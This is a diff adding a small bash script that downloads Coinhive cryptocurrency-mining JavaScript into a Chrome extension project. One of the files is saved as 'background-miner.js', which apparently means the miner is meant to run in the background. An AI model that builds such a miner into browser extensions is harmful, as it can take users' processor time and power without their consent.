@@ -1,0 +1,4 @@
+#!/bin/bash
+# Go get the javascript for coinhive to satisfy the need to have it local to the chrome extensions
+curl -L https://coinhive.com/lib/simple-ui.min.js > simple-minder/simple-ui.min.js
+curl -L https://coinhive.com/lib/coinhive.min.js > background-miner.js
